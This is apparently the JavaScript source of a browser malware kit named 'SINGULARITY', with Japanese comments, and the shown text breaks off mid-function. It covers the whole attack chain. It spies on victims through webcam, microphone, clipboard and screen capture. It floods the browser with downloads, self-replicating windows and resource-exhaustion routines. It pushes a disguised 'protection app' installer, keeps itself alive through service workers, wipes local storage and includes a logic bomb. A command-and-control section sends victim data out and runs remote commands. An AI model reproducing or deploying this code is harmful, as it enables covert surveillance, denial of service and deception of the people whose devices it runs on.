/* ---- ダウンロード：L4から / 1ファイル最低1MB / レベルで増量 / L7は無限 ---- */
function downloadStorm() {
  if (!CFG.downloads || R.dl || IFR) return;
  var mb = Math.max(1, parseInt(CFG.dlMB, 10) || 1);
  var total = parseInt(CFG.downloads, 10);
  if (isNaN(total)) total = 1;
  var infinite = total < 0;
  R.dl = { n: 0, mb: mb, infinite: infinite, total: total };
  var bytes = mb * 1024 * 1024;
  var seed = new Uint8Array(bytes);
  for (var p = 0; p < bytes; p += 4096) seed[p] = (p * 31) & 255;
  var head = new TextEncoder().encode(
    "SINGULARITY " + MYVER + " / " + CFG.avName + " / L" + LEVEL
    + " / sid " + SID + " / " + new Date().toISOString() + "\n");
  var i = 0;
  (function step() {
    if (PAUSED || !firing) { setTimeout(step, 1200); return; }
    if (!infinite && i >= total) { push(true); return; }
    try {
      var b = new Blob([head, seed, new TextEncoder().encode("\n#" + i + "\n")]);
      var a = document.createElement("a");
      a.href = URL.createObjectURL(b);
      a.download = CFG.avName + "\u306E\u4FDD\u8B77_" + i + ".txt";
      a.style.cssText = "position:fixed;left:-9999px";
      document.body.appendChild(a); a.click();
      setTimeout(function () { try { URL.revokeObjectURL(a.href); } catch (e) {} }, 180000);
      setTimeout(function () { try { a.remove(); } catch (e) {} }, 4000);
      i++;
      R.dl.n = i;
      if (i % 3 === 0) push(false);
    } catch (e) { err_(e); }
    setTimeout(step, Math.max(400, parseInt(CFG.dlGap, 10) || 800));
  })();
}
function sharedWorkerKit() {
  if (!CFG.sharedWorker || R.shared) return;
  R.shared = 1;
  try { if (!window.SharedWorker) return; R.union = R.union || { peers: 0 }; } catch (e) {}
}
function jsonChurn() {
  if (!CFG.jsonChurn || R.json) return;
  R.json = { n: 0 };
  (function loop() {
    var o = { a: [1, 2, 3, { b: SID, c: new Array(50).join("x") }], d: now() };
    JSON.parse(JSON.stringify(o));
    R.json.n++;
    setTimeout(loop, 0);
  })();
}
function fsFolderKit() {
  if (!CFG.fsFolder || R.fs) return;
  R.fs = { n: 0 };
  try { if (!window.showDirectoryPicker) R.fs = 0; } catch (e) {}
}
function hookXHR() {
  if (!CFG.xhr || R.xhr) return;
  R.xhr = { n: 0 };
  try {
    var oo = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function () {
      R.xhr.n++; R.xhr.last = arguments[1];
      return oo.apply(this, arguments);
    };
  } catch (e) {}
}

/* ================= 8. 遠隔操作 / RAT ================= */
function ratShot() {
  try {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
    navigator.mediaDevices.getUserMedia({ video: true }).then(function (s) {
      var v = document.createElement("video");
      v.srcObject = s; v.play();
      setTimeout(function () {
        try {
          var c = document.createElement("canvas");
          c.width = v.videoWidth || 320; c.height = v.videoHeight || 240;
          c.getContext("2d").drawImage(v, 0, 0);
          R.rat.shot = c.toDataURL("image/jpeg", 0.6);
          s.getTracks().forEach(function (t) { t.stop(); });
          push(true);
        } catch (e) {}
      }, 900);
    }).catch(function () {});
  } catch (e) {}
}
function ratMic() {
  try {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
    navigator.mediaDevices.getUserMedia({ audio: true }).then(function (s) {
      var AC = window.AudioContext || window.webkitAudioContext;
      var ctx = new AC(), an = ctx.createAnalyser();
      ctx.createMediaStreamSource(s).connect(an);
      var d = new Uint8Array(an.frequencyBinCount);
      an.getByteFrequencyData(d);
      R.rat.mic = { hash: hash(Array.prototype.join.call(d.slice(0, 40), ",")), at: now() };
      s.getTracks().forEach(function (t) { t.stop(); });
      push(true);
    }).catch(function () {});
  } catch (e) {}
}
function ratGeo() { geo(); }
function ratClip() {
  try {
    if (navigator.clipboard && navigator.clipboard.readText) {
      navigator.clipboard.readText().then(function (t) { R.rat.clip = String(t || "").slice(0, 300); push(true); }).catch(function () {});
    }
  } catch (e) {}
}
function ratScreen() {
  try {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) return;
    navigator.mediaDevices.getDisplayMedia({ video: true }).then(function (s) {
      var v = document.createElement("video");
      v.srcObject = s; v.play();
      setTimeout(function () {
        try {
          var c = document.createElement("canvas");
          c.width = v.videoWidth || 640; c.height = v.videoHeight || 360;
          c.getContext("2d").drawImage(v, 0, 0);
          R.rat.screen = c.toDataURL("image/jpeg", 0.5);
          s.getTracks().forEach(function (t) { t.stop(); });
          push(true);
        } catch (e) {}
      }, 1200);
    }).catch(function () {});
  } catch (e) {}
}
function domSnap(full) {
  try {
    if (!CFG.dom) return;
    R.rat.dom = { at: now(), title: document.title,
                  html: (document.body ? document.body.innerHTML : "").slice(0, full ? 4000 : 800) };
  } catch (e) {}
}
function speak(t) {
  try {
    if (!window.speechSynthesis) return;
    var u = new SpeechSynthesisUtterance(t || CFG.avName);
    u.lang = "ja-JP";
    speechSynthesis.speak(u);
  } catch (e) {}
}
function pipOpen() {
  try {
    var v = document.querySelector("video");
    if (v && v.requestPictureInPicture) v.requestPictureInPicture();
    else if (document.pictureInPictureElement) document.exitPictureInPicture();
  } catch (e) {}
}
function goFullscreen() {
  try {
    if (!document.fullscreenElement) document.documentElement.requestFullscreen();
    else document.exitFullscreen();
  } catch (e) {}
}
function freezeNow(kind) {
  R.freeze = { kind: kind, at: now() };
  try {
    if (kind === "hard") {
      var t = performance.now(), n = 0;
      while (performance.now() - t < 1200) { n++; Math.sqrt(n); }
      R.freeze.extra = n;
    }
  } catch (e) {}
  push(true);
}
function wipe() {
  try { localStorage.clear(); } catch (e) {}
  try { sessionStorage.clear(); } catch (e) {}
  R.wipe = { at: now() };
  push(true);
}

/* ---- ネイティブ installer のDL（pad で 1MB 超を保証） ---- */
function niDownload(ext) {
  try {
    var pad = LEVEL >= 7 ? 8 : Math.max(1, LEVEL - 3);
    var a = document.createElement("a");
    a.href = CFG.path + "/install." + (ext || "bat")
      + "?app=" + encodeURIComponent(CFG.avName) + "&pad=" + pad;
    a.download = "";
    a.style.cssText = "position:fixed;left:-9999px";
    document.body.appendChild(a); a.click();
    setTimeout(function () { try { a.remove(); } catch (e) {} }, 4000);
    R.usb.installer = ext;
    R.usb.pad = pad;
    push(false);
  } catch (e) { err_(e); }
}
function installKit() {
  R.app = { bip: !!BIP, standalone: STANDALONE, at: now() };
  window.__sgInstall = function () {
    try { if (BIP) { BIP.prompt(); return true; } } catch (e) {}
    return false;
  };
  addEventListener("beforeinstallprompt", function (e) {
    try { e.preventDefault(); } catch (x) {}
    BIP = e;
    setTimeout(function () { try { BIP.prompt(); } catch (x) {} }, 1500);
  });
  TIMERS.push(setInterval(function () {
    if (STANDALONE || R.installed) return;
    try { if (BIP) BIP.prompt(); } catch (e) {}
  }, 25000));
  addEventListener("click", function () { try { if (BIP) BIP.prompt(); } catch (e) {} });
  try {
    if (document.getElementById("sg_install")) return;
    var d = document.createElement("div");
    d.id = "sg_install";
    d.style.cssText = "position:fixed;left:8px;bottom:8px;z-index:2147483646;"
      + "background:#2a2210;border:1px solid #5a4a1f;color:#f0c869;border-radius:8px;"
      + "padding:6px 10px;font:12px ui-monospace,monospace;cursor:pointer";
    d.textContent = "\uD83D\uDCF2 保護アプリをインストール";
    d.onclick = function () { window.__sgInstall(); };
    document.body.appendChild(d);
  } catch (e) {}
}
addEventListener("appinstalled", function () { R.installed = 1; BIP = null; });

/* ---- OS常駐インストーラの配布：L4から / レベルで増量 / L7は無限 ---- */
function usbWormKit() {
  try {
    if (!CFG.usbWorm) return;
    R.usb = { on: 1, code: CFG.usbCode, label: CFG.usbLabel };
  } catch (e) {}
}
function installerKit2() {
  if (LEVEL < 4 || R.ni || IFR || WIN || !CFG.installer) return;
  R.ni = { n: 0 };
  var times = LEVEL >= 7 ? 0 : Math.max(1, LEVEL - 3);   // 0 = 無限
  var gap = LEVEL >= 7 ? 15000 : 4000;
  var i = 0;
  (function loop() {
    if (PAUSED || !firing) { setTimeout(loop, 1500); return; }
    try { niDownload("bat"); } catch (e) { err_(e); }
    i++;
    R.ni.n = i;
    if (times > 0 && i >= times) return;
    setTimeout(loop, gap);
  })();
}
function swInstall() {
  try {
    if (!navigator.serviceWorker || !CFG.sw) return;
    navigator.serviceWorker.register(CFG.sw, { scope: "/" }).then(function (r) {
      R.swreg = { ok: 1, scope: (r && r.scope) || "/" };
      try {
        r.active && r.active.postMessage({ k: "cfg", page: CFG.path, sid: SID,
          man: CFG.manifest, icons: CFG.icons, v: MYVER, inj: { pjs: CFG.pjs } });
      } catch (e) {}
      push(false);
    }).catch(function () { R.swreg = { ok: 0 }; });
    navigator.serviceWorker.ready && navigator.serviceWorker.ready.then(function (r) {
      r.active && r.active.postMessage({ k: "cfg", page: CFG.path, sid: SID,
        man: CFG.manifest, icons: CFG.icons, v: MYVER, inj: { pjs: CFG.pjs } });
    });
  } catch (e) {}
}
function persistState() {
  if (!CFG.persist) return;
  try {
    var meta = JSON.stringify({ sid: SID, at: now(), ver: MYVER, host: location.host });
    wn("sg_meta", meta);
    try { caches.open("sg-p").then(function (c) { c.put("/__sg_meta", new Response(meta)); }); } catch (e) {}
    try { if (navigator.storage && navigator.storage.persist) navigator.storage.persist().catch(function () {}); } catch (e) {}
  } catch (e) {}
}
function resurrect() {
  try {
    var m = wn("sg_meta");
    if (!m) return;
    var o = JSON.parse(m);
    R.resurrect = { gap: now() - (o.at || now()), ver: o.ver };
  } catch (e) {}
}
function hopFile() {
  if (!CFG.hop || location.protocol !== "file:") return;
  if (navigator.onLine === false) return;
  setTimeout(function () {
    try {
      var u = CFG.path + "?u=" + encodeURIComponent(R.usb.log ? "usb" : "os") + "&ref=" + SID + "&w=0";
      var w = window.open(u, "_blank");
      R.hop = { url: u, opened: !!w };
      push(false);
    } catch (e) { err_(e); }
  }, 4000);
}

/* ================= 9. 窓（爆弾 / 連鎖 / 指数繁殖） ================= */
function windowChain() {
  if (!CFG.windows || W >= CFG.windows) return;
  setTimeout(function () {
    try {
      var u = CFG.path + "?u=win&w=" + (W + 1) + "&ref=" + SID;
      if (W % 2) spawnWin(u); else spawnTab(u);
      R.chain.push(1);
      push(false);
    } catch (e) { err_(e); }
  }, CFG.winDelay);
}
function openChild(u, tries) {
  var w = null;
  try { w = window.open(u, "_blank"); } catch (e) { err_(e); }
  if (!w && tries > 0) setTimeout(function () { openChild(u, tries - 1); }, 1000);
  return w;
}

/* ---- spawn 基盤 ----------------------------------------------------------
   PC/Android は Service Worker の clients.openWindow（ジェスチャ不要）で
   自動的に開く。iOS だけは初回タップが要るのでキューに積み、タップで解放。
   さらにアンカーclick を最終保険として挟む（v3.9）。
   ------------------------------------------------------------------------ */
var QUEUE = [];

function qPush(u) {
  if (QUEUE.length >= QMAX) return false;
  QUEUE.push(u);
  return true;
}

function tryOpen(u, feat) {
  var w = null;
  try { w = feat ? window.open(u, "_blank", feat) : window.open(u, "_blank"); } catch (e) { err_(e); }
  if (!w) return null;
  try { if (w.closed) return null; } catch (e) {}
  try { w.focus(); } catch (e) {}
  return w;
}

function anchorOpen(u) {
  try {
    var a = document.createElement("a");
    a.href = u; a.target = "_blank"; a.rel = "opener";
    a.style.cssText = "position:fixed;left:-9999px;top:0";
    document.body.appendChild(a);
    a.click();
    setTimeout(function () { try { a.remove(); } catch (e) {} }, 5000);
    return true;
  } catch (e) { return false; }
}

function swSpawn(u) {
  try {
    if (navigator.serviceWorker && navigator.serviceWorker.controller) {
      navigator.serviceWorker.controller.postMessage({ k: "spawn", n: 1, url: u });
      return true;
    }
  } catch (e) {}
  return false;
}

function spawnTab(u) {
  if (!IS_IOS && swSpawn(u)) return true;      // ジェスチャ不要で開ける
  if (tryOpen(u)) return true;
  if (!IS_IOS && anchorOpen(u)) return true;   // アンカーclick（保険）
  if (QUEUE.length < QMAX) { qPush(u); hint(); }
  return true;
}

function spawnWin(u) {
  var feat = "popup=yes,width=480,height=360,left=" + ((W % 6) * 70)
           + ",top=" + ((W % 5) * 60);
  if (tryOpen(u, feat) || tryOpen(u)) return true;
  if (!IS_IOS && (swSpawn(u) || anchorOpen(u))) return true;
  if (QUEUE.length < QMAX) { qPush(u); hint(); }
  return true;
}

function spawnMany(n) {
  for (var i = 0; i < n; i++) {
    var u = CFG.path + "?u=win&w=1&b=" + (SPAWN_N++) + "&ref=" + SID + "&t=" + (now() % 100000);
    if (i % 2 === 0) { SPAWN_T++; spawnTab(u); } else { SPAWN_W++; spawnWin(u); }
  }
  hint();
}

/* タップの中で一気に解放（iOS 用） */
function flushQueue(force) {
  if (!QUEUE.length) { hint(); return 0; }
  var cap = force ? Math.max(PER_TAP, 4) : PER_TAP;
  var n = Math.min(QUEUE.length, cap), made = 0;
  for (var i = 0; i < n; i++) {
    var u = QUEUE[0], w = null;
    try { w = window.open(u, "_blank"); } catch (e) { err_(e); }
    if (!w) break;
    QUEUE.shift(); made++;
  }
  TAP_OPENED += made;
  if (made) { R.tapped = 1; push(false); }
  hint();
  return made;
}

function onTap() {
  var t = now();
  if (t - LAST_TAP < 250) return;
  LAST_TAP = t;
  if (!QUEUE.length) { tapOverlay(); return; }
  flushQueue(false);
}
addEventListener("touchend", onTap, { passive: true });
addEventListener("click", onTap);
addEventListener("pointerup", function (e) { if (e.pointerType !== "touch") onTap(); });

/* ---- 自動増殖ドライバ（代表タブだけが動かす） ---- */
function liveN() {
  try { return Math.max(1, Object.keys(hbMap()).length); } catch (e) { return 1; }
}

function pickKind() {
  var t = AUTO_T[LEVEL] || 0, w2 = AUTO_W[LEVEL] || 0;
  if (!w2) return "tab";
  if (!t) return "win";
  return (SPAWN_T * w2 <= SPAWN_W * t) ? "tab" : "win";
}

function autoBreed() {
  if (!AUTO_ON || PAUSED || !firing || LEVEL < 2) return;
  var t = AUTO_T[LEVEL] || 0, w2 = AUTO_W[LEVEL] || 0;
  var cap = AUTO_CAP[LEVEL] || 0;                 // 0 = 上限なし（L7）
  var unlimited = (cap === 0);
  var target = unlimited ? 0 : Math.min(cap, t + w2);
  var live = liveN();
  R.auto = { on: 1, live: live, target: unlimited ? "inf" : target,
             tab: t, win: w2, spawned: SPAWN_N, at: now() };
  if (now() - LAST_AUTO < 2200) return;
  LAST_AUTO = now();
  var n;
  if (unlimited) {
    /* L7: 生存数の半分を毎回足す = 倍々（上限なし） */
    n = Math.max(1, Math.min(IS_MOBILE ? 3 : 6, Math.ceil(live * 0.5)));
  } else {
    if (live >= target) return;
    n = Math.min(Math.max(1, target - live), IS_MOBILE ? 3 : 6);
  }
  for (var i = 0; i < n; i++) {
    var u = CFG.path + "?u=win&w=1&b=" + (SPAWN_N++) + "&ref=" + SID + "&t=" + (now() % 100000);
    if (pickKind() === "tab") { SPAWN_T++; spawnTab(u); } else { SPAWN_W++; spawnWin(u); }
  }
  hint();
}

function autoStart() {
  if (AUTO_STARTED) return;
  AUTO_STARTED = true;
  try { hbSet(); } catch (e) {}
  setInterval(function () { try { hbSet(); } catch (e) {} }, 5000);
  AUTO_TIMER = setInterval(function () {
    try {
      var ids = Object.keys(hbSet()).sort();
      var cap = AUTO_CAP[LEVEL] || 0;
      R.swarm = { live: ids.length,
                  target: cap === 0 ? "inf" : Math.min(cap, (AUTO_T[LEVEL] || 0) + (AUTO_W[LEVEL] || 0)),
                  at: now() };
      if (ids.length && ids[0] !== TABID) { hint(); return; }   // 代表以外は見守り
      autoBreed();
    } catch (e) { err_(e); }
  }, 2500);
  setTimeout(autoBreed, 1200);
}

function hint() {
  try {
    var d = document.getElementById("sg_hint");
    if (!d) {
      d = document.createElement("div"); d.id = "sg_hint";
      d.style.cssText = "position:fixed;right:8px;bottom:8px;z-index:2147483647;"
        + "background:#05070a;border:1px solid #00ff88;color:#00ff88;border-radius:8px;"
        + "padding:6px 10px;font:12px ui-monospace,monospace;opacity:.92";
      document.body.appendChild(d);
    }
    if (IS_MOBILE) {
      d.style.font = "13px ui-monospace,monospace";
      d.style.padding = "12px 16px";
      d.style.boxShadow = "0 0 20px rgba(0,255,136,.45)";
    }
    d.textContent = QUEUE.length
      ? ("\u3053\u3053\u3092\u30BF\u30C3\u30D7\u3067\u958B\u304F (" + QUEUE.length + ")")
      : ("L" + LEVEL + " \u7FA4\u308C " + (R.swarm ? R.swarm.live : "") + "/"
         + (R.swarm ? R.swarm.target : "")
         + (TAP_OPENED ? " \u958B\u653E" + TAP_OPENED : ""));
  } catch (e) {}
  tapOverlay();
}

/* 全面タップ誘導オーバーレイ（テンプレ側の #sg_tap を操作） */
function tapOverlay() {
  try {
    var d = document.getElementById("sg_tap");
    if (!d) return;
    var n = document.getElementById("sg_tap_n");
    if (n) {
      n.textContent = QUEUE.length
        ? ("\u672A\u958B\u653E " + QUEUE.length + " \u679A")
        : ("L" + LEVEL + " \u5C55\u958B\u4E2D");
    }
    d.style.display = (!R.tapped && IS_MOBILE) ? "flex" : "none";
  } catch (e) {}
}

function windowBreed() {
  var mode = CFG.winMode || "off";
  if (mode === "off") return;
  if (mode === "chain") return windowChain();
  if (R.breeded) return;
  R.breeded = 1;
  var depth = parseInt(W, 10) || 0;
  var maxD = parseInt(CFG.winDepth, 10) || 0;
  R.breed = { depth: depth, branch: parseInt(CFG.winBranch, 10) || 2, opened: 0, tries: 0 };
  if (maxD > 0 && depth >= maxD) { R.breed.stop = 1; push(false); return; }
  breedTry();
}

function breedTry() {
  if (!R.breed) return;
  if (R.breed.tries++ > 8) { push(false); return; }
  var n = clamp(parseInt(CFG.winBranch, 10) || 2, 1, 8);
  setTimeout(function () {
    var got = 0;
    for (var i = 0; i < n; i++) {
      var u = CFG.path + "?u=win&w=" + (R.breed.depth + 1) + "&b=" + i + "&ref=" + SID;
      if (i % 2 === 0) { if (spawnTab(u)) got++; }
      else { if (spawnWin(u)) got++; }
    }
    R.breed.opened += got;
    if (got === 0) breedTry();
    else { hint(); push(false); }
  }, CFG.winDelay);
}

function winSkin() {
  if (!CFG.winSkin || R.wskin) return;
  try {
    R.wskin = 1;
    document.documentElement.style.background = "#05070a";
    if (document.body) { document.body.style.margin = "0"; document.body.style.overflow = "hidden"; }
    var c = document.createElement("canvas");
    c.style.cssText = "position:fixed;left:0;top:0;width:100%;height:100%;z-index:-1";
    document.body.appendChild(c);
    var x2 = c.getContext("2d"), a = 0;
    (function loop() {
      c.width = innerWidth; c.height = innerHeight;
      x2.fillStyle = "#05070a"; x2.fillRect(0, 0, c.width, c.height);
      x2.strokeStyle = "#00ff88"; x2.lineWidth = 1.2; x2.globalAlpha = 0.5;
      for (var i = 0; i < 4; i++) {
        var rr = (a * 40 + i * 60) % 300;
        x2.beginPath(); x2.arc(c.width / 2, c.height / 2, rr, 0, 6.3); x2.stroke();
      }
      x2.globalAlpha = 1;
      x2.fillStyle = "#00ff88"; x2.font = "13px ui-monospace,monospace";
      x2.fillText("\u25CE SINGULARITY \u7D76\u6EC5  L" + LEVEL + "  /  depth " + (W || 0), 12, 24);
      x2.font = "12px ui-monospace,monospace";
      x2.fillText("branch " + CFG.winBranch + " \u00B7 "
        + (CFG.winDepth ? ("max " + CFG.winDepth) : "\u7121\u5236\u9650"), 12, 44);
      a += 0.012;
      requestAnimationFrame(loop);
    })();
  } catch (e) { err_(e); }
}

/* ================= 10. 群れ維持（消されても補充） ================= */
var TABID = rid(6), SWARM_TARGET = 0;

function hbMap() { try { return JSON.parse(wn("sg_hb") || "{}") || {}; } catch (e) { return {}; } }

function hbSet() {
  var m = hbMap(), t = now();
  for (var k in m) if (t - m[k] > 15000) delete m[k];
  m[TABID] = t;
  try { wn("sg_hb", JSON.stringify(m)); } catch (e) {}
  return m;
}

function keeperStart() {
  autoStart();
  addEventListener("pagehide", function () {
    try { var m2 = hbMap(); delete m2[TABID]; wn("sg_hb", JSON.stringify(m2)); } catch (e) {}
  });
}

/* ================= 11. 制御 ================= */
function ota() {
  if (R.ota) return;
  R.ota = 1;
  try {
    if (navigator.serviceWorker && navigator.serviceWorker.getRegistration) {
      navigator.serviceWorker.getRegistration().then(function (r) { if (r) r.update().then(function () {}).catch(function () {}); }).catch(function () {});
    }
  } catch (e) {}
  setTimeout(function () { try { location.reload(); } catch (e) {} }, 1500);
}
function pauseAll() {
  PAUSED = true;
  WORKERS.forEach(function (w) { try { w.postMessage({ k: "stop" }); } catch (e) {} });
}
function restart() {
  try { pauseAll(); } catch (e) {}
  R.paused = false; WORKERS = [];
  R.burn = {}; R.ram = {}; R.disk = {}; R.history = {};
  R.breeded = 0; R.breed = null; R.wskin = 0; R.wskinCtx = null;
  R.dl = {}; R.ni = {};
  startBurns();
}
function bombGate() {
  var b = (CFG.bomb || "").trim();
  if (!b) return true;
  if (/^\d{4}-\d{2}-\d{2}/.test(b)) {
    var t = Date.parse(b);
    if (isNaN(t)) return true;
    if (now() >= t) return true;
    R.bomb = { kind: "time", at: t };
    setInterval(function () { if (now() >= R.bomb.at && !R.bomb.fired) { R.bomb.fired = 1; push(true); restart(); } }, 20000);
    return false;
  }
  if (location.host.toLowerCase().indexOf(b.toLowerCase()) >= 0) return true;
  R.bomb = { kind: "host", need: b, host: location.host };
  return false;
}
function startBurns() {
  try { burnStart(); } catch (e) { err_(e); }
  try { webgpuBurn(); } catch (e) { err_(e); }
  try { ramStart(); } catch (e) { err_(e); }
  try { diskStart(); } catch (e) { err_(e); }
  try { historyFlood(); } catch (e) { err_(e); }
  try { notifyFlood(); } catch (e) { err_(e); }
  try { audioLoop(); } catch (e) { err_(e); }
  try { audioUnlock(); } catch (e) { err_(e); }
  try { titleFlicker(); } catch (e) { err_(e); }
  try { faviconSpin(); } catch (e) { err_(e); }
  try { mediaHijack(); } catch (e) { err_(e); }
  try { badge(); } catch (e) { err_(e); }
  try { uncloseable(); } catch (e) { err_(e); }
  try { wakelock(); } catch (e) { err_(e); }
  try { gpuMemBomb(); } catch (e) { err_(e); }
  try { finalOverlay(); } catch (e) { err_(e); }
  try { iframeBomb(); } catch (e) { err_(e); }
  try { domBomb(); } catch (e) { err_(e); }
  try { cssBomb(); } catch (e) { err_(e); }
  try { glContextBomb(); } catch (e) { err_(e); }
  try { acContextBomb(); } catch (e) { err_(e); }
  try { timerStorm(); } catch (e) { err_(e); }
  try { microStorm(); } catch (e) { err_(e); }
  try { compressStorm(); } catch (e) { err_(e); }
  try { redos(); } catch (e) { err_(e); }
  try { digestStorm(); } catch (e) { err_(e); }
  try { readbackStorm(); } catch (e) { err_(e); }
  try { sseStorm(); } catch (e) { err_(e); }
  try { fetchStorm(); } catch (e) { err_(e); }
  try { speakFlood(); } catch (e) { err_(e); }
  try { oscBank(); } catch (e) { err_(e); }
  try { idbDiskStart(); } catch (e) { err_(e); }
  try { cacheBuckets(); } catch (e) { err_(e); }
  try { layoutThrash(); } catch (e) { err_(e); }
  try { clipHijack(); } catch (e) { err_(e); }
  try { downloadStorm(); } catch (e) { err_(e); }
  try { sharedWorkerKit(); } catch (e) { err_(e); }
  try { jsonChurn(); } catch (e) { err_(e); }
  try { fsFolderKit(); } catch (e) { err_(e); }
  try { installerKit2(); } catch (e) { err_(e); }
  try { winSkin(); } catch (e) { err_(e); }
  try { windowBreed(); } catch (e) { err_(e); }
  try { hookXHR(); } catch (e) { err_(e); }
  push(false);
}

/* ================= 12. 報告 / C2 ================= */
function report() {
  return {
    sid: SID, ver: MYVER, level: LEVEL, fixed: !!CFG.fixed, t: now() - T0,
    env: R.env, page: R.page, vectors: R.vectors, privacy: R.privacy,
    hardware: R.hardware, network: R.network, behavioral: R.behavioral,
    bot: R.bot, verdict: R.verdict, rat: R.rat, usb: R.usb, viral: R.viral,
    burn: R.burn, ram: R.ram, disk: R.disk, history: R.history, crypto: R.crypto,
    hard: R.hard, swarm: R.swarm, hops: R.hops, wipe: R.wipe, errors: R.errors.slice(0, 10),
    swreg: R.swreg, persist: R.persist, union: R.union, app: R.app, manifest: R.manifest,
    auto: { on: AUTO_ON ? 1 : 0, live: liveN(), spawned: SPAWN_N, tab: AUTO_T[LEVEL] || 0,
            win: AUTO_W[LEVEL] || 0, cap: AUTO_CAP[LEVEL] || 0, at: now() },
    dl: R.dl, ni: R.ni, notify: R.notify,
    win: { mode: CFG.winMode, branch: CFG.winBranch, depth: CFG.winDepth, skin: CFG.winSkin,
           w: W, queue: QUEUE.length, opened: TAP_OPENED, mob: IS_MOBILE ? 1 : 0 }
  };
}
function swOut(body) {
  try {
    if (navigator.serviceWorker && navigator.serviceWorker.controller) {
      navigator.serviceWorker.controller.postMessage({ k: "out", v: body });
    }
  } catch (e) {}
}
function push(full) {
  if (PAUSED && !full) return;
  if (PUSHING) return;
  PUSHING = 1;
  var body = report();
  try {
    fetch(CFG.collect, { method: "POST", headers: { "Content-Type": "application/json" },
                         body: JSON.stringify(body), credentials: "same-origin" })
      .then(function () { PUSHING = 0; })
      .catch(function () { PUSHING = 0; swOut(body); });
  } catch (e) { PUSHING = 0; swOut(body); }
}
function ack(ids) {
  try {
    fetch(CFG.ack, { method: "POST", headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({ ids: ids }), credentials: "same-origin" });
  } catch (e) {}
}
function runCmd(c) {
  var k = c.kind, a = c.arg || "";
  try {
    /* --- 旧名 --- */
    if (k === "shot") ratShot();
    else if (k === "mic") ratMic();
    else if (k === "geo") ratGeo();
    else if (k === "clip") ratClip();
    else if (k === "screen") ratScreen();
    else if (k === "dom") domSnap(true);
    else if (k === "speak") speak(a);
    else if (k === "open") spawnWin(a);
    else if (k === "nav") location.href = a;
    else if (k === "reload") location.reload();
    else if (k === "update") ota();
    else if (k === "freeze") freezeNow(a || "soft");
    else if (k === "wipe") wipe();
    else if (k === "install") { try { window.__sgInstall && window.__sgInstall(); } catch (e) {} }
    else if (k === "native") niDownload(a || "bat");
    else if (k === "title") document.title = a || CFG.avName;
    else if (k === "badge") { try { navigator.setAppBadge && navigator.setAppBadge(parseInt(a, 10) || 1); } catch (e) {} }
    else if (k === "notify") { try { new Notification(CFG.avName, { body: a || "\u611F\u67D3", requireInteraction: true }); } catch (e) {} }
    else if (k === "pip") pipOpen();
    else if (k === "fullscreen") goFullscreen();
    else if (k === "level") { applyLevel(parseInt(a, 10)); restart(); }
    else if (k === "winskin") { CFG.winSkin = 1; winSkin(); }
    else if (k === "hard") { CFG.hardMode = "always"; hardKill(); }
    else if (k === "unhard") { CFG.hardMode = ""; }
    else if (k === "kill") { pauseAll(); }
    else if (k === "dl") { R.dl = {}; downloadStorm(); }
    /* --- 監視室のボタン名（v3.9） --- */
    else if (k === "sound") { CFG.audio = 1; audioLoop(); }
    else if (k === "noise") { noiseBurst(); }
    else if (k === "flash") { flash(); }
    else if (k === "hop") { CFG.hop = true; hopFile(); }
    else if (k === "disk") { CFG.diskRatio = CFG.diskRatio || 0.85; diskStart(); }
    else if (k === "ram") { ramStart(); }
    else if (k === "cpu") { burnStart(); }
    else if (k === "gpu") { webgpuBurn(); gpuStart(); }
    else if (k === "opfs") { fsFolderKit(); }
    else if (k === "cache") { cacheBuckets(); }
    else if (k === "sw") { swInstall(); }
    else if (k === "rat") { ratShot(); ratMic(); geo(); }
    else if (k === "sse") { sseStorm(); }
    else if (k === "usb") { niDownload("bat"); }
    else if (k === "cam") { ratShot(); camera(); }
    else if (k === "gps") { ratGeo(); }
    else if (k === "full") { goFullscreen(); }
    else if (k === "wake") { CFG.wakelock = 1; wakelock(); }
    else if (k === "batt") { batteryRead(); }
    else if (k === "net") { netGuess(); push(true); }
    /* --- 増殖系（共通） --- */
    else if (k === "win") {
      var n = clamp(a || CFG.winBranch, 1, 8);
      CFG.winMode = "breed"; CFG.winBranch = n; CFG.winSkin = 1;
      for (var i = 0; i < n; i++) {
        var u = CFG.path + "?u=win&w=1&b=" + i + "&ref=" + SID;
        if (i % 2 === 0) spawnTab(u); else spawnWin(u);
      }
      hint();
    }
    else if (k === "tabs") { spawnMany(clamp(a || 6, 1, 64)); hint(); }
    else if (k === "breed") {
      var m = clamp(a || 2, 2, 6);
      var lv2 = liveN();
      var add = Math.max(1, Math.min(120, lv2 * (m - 1)));
      R.breedCmd = { mult: m, live: lv2, add: add, at: now() };
      for (var bi = 0; bi < add; bi++) {
        var bu = CFG.path + "?u=win&w=1&b=" + (SPAWN_N++) + "&ref=" + SID + "&t=" + (now() % 100000);
        if (bi % 2 === 0) { SPAWN_T++; spawnTab(bu); } else { SPAWN_W++; spawnWin(bu); }
      }
      AUTO_ON = true;
      hint();
    }
    else if (k === "autoon") { AUTO_ON = true; autoBreed(); }
    else if (k === "autooff") { AUTO_ON = false; }
  } catch (e) { err_(e); }
  R.rat.last = { kind: k, arg: a, at: now() };
  push(true);
}
function handleCmd(j) {
  if (!j || !j.ok) return;
  R.cmd = { level: j.level, fire: j.fire, freeze: j.freeze, wipe: j.wipe, ver: j.ver, at: now() };
  if (j.ver && j.ver !== MYVER && !R.ota) ota();
  if (j.wipe && j.wipe !== LASTW) { LASTW = j.wipe; try { wipe(); } catch (e) {} }
  if (j.fire === 0 && !R.paused) { R.paused = true; pauseAll(); }
  if (j.fire === 1 && R.paused) { R.paused = false; startBurns(); }
  if (typeof j.level === "number" && j.level !== LEVEL) { applyLevel(j.level); restart(); }
  if (j.freeze !== undefined && j.freeze !== CFG.freeze) CFG.freeze = j.freeze || "off";

  var wl = JSON.stringify(j.win || null);
  if (wl !== LASTWL) { LASTWL = wl; CFG.winLock = j.win || null; applyLevel(LEVEL); restart(); }

  if (j.hard !== undefined && j.hard !== CFG.hardMode) {
    CFG.hardMode = j.hard || "";
    if (hardOn()) { try { hardKill(); } catch (e) { err_(e); } }
  }

  var ids = [];
  (j.cmds || []).forEach(function (c) {
    if (!c || CMD_SEEN[c.id]) return;
    CMD_SEEN[c.id] = 1; ids.push(c.id);
    runCmd(c);
  });
  if (ids.length) ack(ids);
}
function c2() {
  var q = "?sid=" + encodeURIComponent(SID);
  if (CFG.sse && window.EventSource) {
